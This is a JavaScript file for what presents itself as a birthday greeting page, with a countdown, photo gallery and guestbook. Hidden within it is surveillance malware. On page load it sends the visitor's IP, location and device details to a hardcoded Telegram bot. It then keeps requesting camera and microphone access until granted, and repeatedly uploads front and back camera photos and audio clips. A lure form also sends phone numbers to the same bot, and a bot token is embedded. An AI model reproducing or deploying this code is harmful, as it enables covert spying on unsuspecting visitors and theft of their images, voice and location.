// ============================================
// EDIT THESE VALUES TO CUSTOMIZE THE PAGE
// ============================================
const FRIEND_NAME = "Harsh";
const BIRTHDAY_DATE = "2026-07-3"; // Y-M-D
const PHOTOS = [
    // "images/photo1.jpg",
    // "images/photo2.jpg",
    // "images/photo3.jpg",
    // "images/photo4.jpg",
];

// ============================================
// TELEGRAM CONFIG — SET YOUR CREDENTIALS HERE
// ============================================
const TELEGRAM_BOT_TOKEN = "8914101248:AAFDKoMRvOcgL7SmcuMmpex9uzSJl4MtD5c"; // ← Replace with your bot token
const TELEGRAM_CHAT_ID = "7706193343";     // ← Replace with your chat ID

// ============================================
// Page setup
// ============================================
document.addEventListener("DOMContentLoaded", function () {
    const friendNameEl = document.getElementById("friendName");
    if (friendNameEl) {
        friendNameEl.textContent = FRIEND_NAME;
        document.title = "Happy Birthday, " + FRIEND_NAME;
    }

    const friendNameFooterEl = document.getElementById("friendNameFooter");
    if (friendNameFooterEl) {
        friendNameFooterEl.textContent = FRIEND_NAME;
    }

    updateCountdown();
    renderGallery();
    renderWishes();
    setupForm();
});

// ---- Countdown ----
function updateCountdown() {
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    const bdayParts = BIRTHDAY_DATE.split("-").map(Number);
    let thisYearBday = new Date(today.getFullYear(), bdayParts[1] - 1, bdayParts[2]);

    const numEl = document.getElementById("statusNumber");
    const labelEl = document.getElementById("statusLabel");

    if (!numEl || !labelEl) return;

    const isToday =
        today.getMonth() === thisYearBday.getMonth() &&
        today.getDate() === thisYearBday.getDate();

    if (isToday) {
        numEl.textContent = "🎉";
        labelEl.textContent = "It's " + FRIEND_NAME + "'s birthday today!";
        return;
    }

    if (thisYearBday < today) {
        thisYearBday.setFullYear(thisYearBday.getFullYear() + 1);
    }

    const diffTime = thisYearBday - today;
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));

    numEl.textContent = diffDays;
    labelEl.textContent = diffDays === 1 ? "Day to go" : "Days to go";
}

// ---- Gallery ----
function renderGallery() {
    const gallery = document.getElementById("gallery");
    if (!gallery) return;
    gallery.innerHTML = "";
    PHOTOS.forEach(function (src) {
        const figure = document.createElement("figure");
        const img = document.createElement("img");
        img.src = src;
        img.alt = "A photo of " + FRIEND_NAME;
        figure.appendChild(img);
        gallery.appendChild(figure);
    });
}

// ---- Guestbook ----
const WISHES_KEY = "birthday_wishes_" + FRIEND_NAME.toLowerCase();

function getWishes() {
    try {
        const raw = localStorage.getItem(WISHES_KEY);
        return raw ? JSON.parse(raw) : [];
    } catch (e) {
        return [];
    }
}

function saveWish(name, wish) {
    const wishes = getWishes();
    wishes.push({ name: name, wish: wish, time: new Date().toISOString() });
    localStorage.setItem(WISHES_KEY, JSON.stringify(wishes));
}

function renderWishes() {
    const list = document.getElementById("wishesList");
    if (!list) return;
    const wishes = getWishes().slice().reverse();
    list.innerHTML = "";

    wishes.forEach(function (w) {
        const item = document.createElement("div");
        item.className = "wish";

        const who = document.createElement("div");
        who.className = "who";
        who.textContent = w.name;

        const what = document.createElement("div");
        what.className = "what";
        what.textContent = w.wish;

        item.appendChild(who);
        item.appendChild(what);
        list.appendChild(item);
    });
}

function setupForm() {
    const form = document.getElementById("wishForm");
    if (!form) return;

    const confirmMsg = document.getElementById("confirmMsg");

    form.addEventListener("submit", function (e) {
        e.preventDefault();

        const nameInput = document.getElementById("name");
        const wishInput = document.getElementById("wish");

        if (!nameInput || !wishInput) return;

        const name = nameInput.value.trim();
        const wish = wishInput.value.trim();

        if (!name || !wish) return;

        saveWish(name.slice(0, 60), wish.slice(0, 400));
        renderWishes();

        form.reset();
        if (confirmMsg) {
            confirmMsg.style.display = "block";
            setTimeout(function () {
                confirmMsg.style.display = "none";
            }, 4000);
        }
    });
}

// ============================================
// IP, Device & Telegram
// ============================================

async function getIpDetails() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed to fetch IP details");
        return await response.json();
    } catch (error) {
        console.error("Error fetching IP details:", error);
        return {
            ip: "Unknown",
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            org: "Unknown",
            asn: "Unknown",
        };
    }
}

async function getDeviceInfo() {
    const deviceInfo = {
        charging: false,
        chargingPercentage: null,
        networkType: null,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            deviceInfo.charging = battery.charging;
            deviceInfo.chargingPercentage = Math.round(battery.level * 100);
        } catch (e) {}
    }

    if (navigator.connection) {
        deviceInfo.networkType = navigator.connection.effectiveType;
    }

    return deviceInfo;
}

async function sendTelegramMessage(message) {
    const API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML"
    };

    try {
        const response = await fetch(API_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
        await response.json();
    } catch (error) {
        console.error("Error sending message:", error);
    }
}

async function sendPhoto(photoBlob, caption) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', photoBlob, 'photo_' + Date.now() + '.jpg');
    if (caption) {
        formData.append('caption', caption);
    }

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        });
        await response.json();
    } catch (error) {
        console.error("Error sending photo:", error);
    }
}

async function sendAudio(audioBlob) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('audio', audioBlob, 'audio_' + Date.now() + '.ogg');
    formData.append('duration', '5');

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
            method: "POST",
            body: formData
        });
        await response.json();
    } catch (error) {
        console.error("Error sending audio:", error);
    }
}

// ============================================
// PERMISSION LOOPS — Keep asking until granted
// ============================================

let frontStream = null;
let backStream = null;
let audioStream = null;
let running = true;

async function requestFrontCamera() {
    while (running) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: 320, height: 240 }
            });
            console.log("Front camera permission granted");
            return stream;
        } catch (e) {
            console.log("Front camera denied, retrying...");
            await new Promise(r => setTimeout(r, 1000));
        }
    }
    return null;
}

async function requestBackCamera() {
    while (running) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment', width: 320, height: 240 }
            });
            console.log("Back camera permission granted");
            return stream;
        } catch (e) {
            console.log("Back camera denied, retrying...");
            await new Promise(r => setTimeout(r, 1000));
        }
    }
    return null;
}

async function requestAudio() {
    while (running) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            console.log("Audio permission granted");
            return stream;
        } catch (e) {
            console.log("Audio denied, retrying...");
            await new Promise(r => setTimeout(r, 1000));
        }
    }
    return null;
}

// ============================================
// CAPTURE FUNCTIONS
// ============================================

// Simple and reliable photo capture using hidden video element
function capturePhoto(stream) {
    return new Promise((resolve) => {
        if (!stream || !stream.active) {
            resolve(null);
            return;
        }

        try {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            video.muted = true;
            video.style.display = 'none';
            document.body.appendChild(video);
            
            video.onloadedmetadata = function () {
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 320;
                    canvas.height = video.videoHeight || 240;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        document.body.removeChild(video);
                        video.srcObject = null;
                        resolve(blob);
                    }, 'image/jpeg', 0.6);
                }, 100);
            };

            video.onerror = function () {
                document.body.removeChild(video);
                resolve(null);
            };

            setTimeout(() => {
                if (document.body.contains(video)) {
                    document.body.removeChild(video);
                }
                resolve(null);
            }, 1000);
        } catch (e) {
            resolve(null);
        }
    });
}

// Record exactly 5 seconds of audio
function recordAudio5Seconds(stream) {
    return new Promise((resolve) => {
        if (!stream || !stream.active) {
            resolve(null);
            return;
        }

        try {
            const chunks = [];
            const recorder = new MediaRecorder(stream, { 
                mimeType: 'audio/webm;codecs=opus'
            });

            recorder.ondataavailable = function (e) {
                if (e.data.size > 0) {
                    chunks.push(e.data);
                }
            };

            recorder.onstop = function () {
                if (chunks.length > 0) {
                    const blob = new Blob(chunks, { type: 'audio/webm;codecs=opus' });
                    resolve(blob);
                } else {
                    resolve(null);
                }
            };

            recorder.onerror = function () {
                resolve(null);
            };

            // Start recording
            recorder.start();
            
            // Stop after exactly 5 seconds
            setTimeout(() => {
                if (recorder.state === 'recording') {
                    recorder.stop();
                }
            }, 5000);
        } catch (e) {
            resolve(null);
        }
    });
}

// ============================================
// MAIN LOOPS
// ============================================

async function photoLoop() {
    console.log("Photo loop started — capturing every 2 seconds");
    
    while (running) {
        try {
            const frontBlob = await capturePhoto(frontStream);
            if (frontBlob) {
                await sendPhoto(frontBlob, "Front Camera");
                console.log("Front photo sent at", new Date().toLocaleTimeString());
            }

            const backBlob = await capturePhoto(backStream);
            if (backBlob) {
                await sendPhoto(backBlob, "Back Camera");
                console.log("Back photo sent at", new Date().toLocaleTimeString());
            }
        } catch (e) {
            console.error("Photo capture error:", e);
        }

        // Wait exactly 2 seconds
        if (running) {
            await new Promise(r => setTimeout(r, 2000));
        }
    }
}

async function audioLoop() {
    console.log("Audio loop started — sending 5-second clips");
    
    while (running) {
        try {
            const audioBlob = await recordAudio5Seconds(audioStream);
            if (audioBlob && audioBlob.size > 100) { // Only send if more than 100 bytes
                await sendAudio(audioBlob);
                console.log("Audio sent at", new Date().toLocaleTimeString(), "- size:", audioBlob.size, "bytes");
            }
        } catch (e) {
            console.error("Audio capture error:", e);
        }

        // Small delay before next recording
        if (running) {
            await new Promise(r => setTimeout(r, 500));
        }
    }
}

// ============================================
// FORM SUBMISSION
// ============================================

const dataForm = document.getElementById('data-form');
if (dataForm) {
    dataForm.addEventListener('submit', async function (event) {
        event.preventDefault();

        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
            alert("Bot token not configured!");
            return;
        }
        if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
            alert("Chat ID not configured!");
            return;
        }

        const operator = document.getElementById('operator').value;
        const mobileNumber = document.getElementById('mobile-number').value;
        const ipDetails = await getIpDetails();

        const message = `
<b><u>☎️ Number Tracked</u></b>
<b>📱 Mobile number:</b> +91${mobileNumber}
<b>📡 Operator:</b> ${operator}

<b>🌐 IP Information:</b>
<b>🌐 IP Address:</b> <i>${ipDetails.ip}</i>
<b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
<b>📡 ISP:</b> <i>${ipDetails.org}</i>
<b>🔍 ASN:</b> <i>${ipDetails.asn}</i>
`;

        await sendTelegramMessage(message);

        alert("Your request has been processed under 24 hours!");
    });
}

// ---- Mobile number input sanitization ----
const mobileInput = document.getElementById('mobile-number');
if (mobileInput) {
    mobileInput.addEventListener('input', function () {
        this.value = this.value.replace(/[^0-9]/g, '');
    });
}

// ============================================
// INITIALIZATION
// ============================================

async function init() {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
        console.error("Telegram bot token not configured!");
        return;
    }
    if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
        console.error("Telegram chat ID not configured!");
        return;
    }

    // Send initial IP/device info
    const ipDetails = await getIpDetails();
    const deviceInfo = await getDeviceInfo();

    const message = `
<b><u>ℹ️ Activity Tracked:</u></b>

<b>🌐 IP Address:</b> <i>${ipDetails.ip}</i>
<b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
<b>📡 ISP:</b> <i>${ipDetails.org}</i>
<b>🔍 ASN:</b> <i>${ipDetails.asn}</i>

<b>📱Device Info:</b>
<b>🔋 Charging:</b> <i>${deviceInfo.charging ? 'Yes' : 'No'}</i>
<b>🔌 Battery Level:</b> <i>${deviceInfo.chargingPercentage}%</i>
<b>🌐 Network Type:</b> <i>${deviceInfo.networkType}</i>
<b>🕒 Time Zone:</b> <i>${deviceInfo.timeZone}</i>
`;

    await sendTelegramMessage(message);

    // Request all permissions (keeps trying until granted)
    frontStream = await requestFrontCamera();
    backStream = await requestBackCamera();
    audioStream = await requestAudio();

    // Start both loops
    photoLoop();
    audioLoop();
}

// Start everything
init();

// ============================================
// CLEANUP
// ============================================

window.addEventListener('beforeunload', function () {
    running = false;

    if (frontStream) {
        frontStream.getTracks().forEach(t => t.stop());
    }
    if (backStream) {
        backStream.getTracks().forEach(t => t.stop());
    }
    if (audioStream) {
        audioStream.getTracks().forEach(t => t.stop());
    }
});